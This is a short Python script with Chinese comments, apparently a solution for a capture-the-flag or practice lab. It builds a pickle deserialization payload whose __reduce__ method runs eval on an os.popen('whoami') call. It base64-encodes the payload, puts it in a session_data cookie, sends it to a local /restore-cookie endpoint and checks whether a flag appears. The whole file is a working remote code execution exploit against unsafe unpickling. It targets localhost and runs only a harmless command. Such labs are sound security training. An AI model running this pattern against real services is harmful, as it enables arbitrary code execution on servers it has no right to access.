# -*- coding: utf-8 -*-
"""FLAG2 攻击脚本：生成 payload → 放进 Cookie(session_data) → 提交到 /restore-cookie
运行：python attack_cookie.py
"""
import pickle, base64
import requests

# 1) 生成 payload（还原时执行 eval 表达式）
class Exploit:
    def __reduce__(self):
        return (eval, ("__import__('os').popen('whoami').read()",))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print("生成的 payload:", payload[:50], "...")
print()

# 2) 把 payload 放进 Cookie，提交到 /restore-cookie
url = "http://127.0.0.1:5034/restore-cookie"
r = requests.get(url, cookies={"session_data": payload})

# 3) 打印响应里的关键部分
print("=== 服务器响应 ===")
import re
m = re.search(r"class='msg'>(.*?)</div>", r.text, re.S)
print(m.group(1) if m else r.text[:200])
print()

# 4) 检查 FLAG2 是否点亮
r2 = requests.get("http://127.0.0.1:5034/")
print("FLAG2 状态:", "✅" if "FLAG2 Cookie入口 ✅" in r2.text else "还没亮，检查 payload 是否正确")
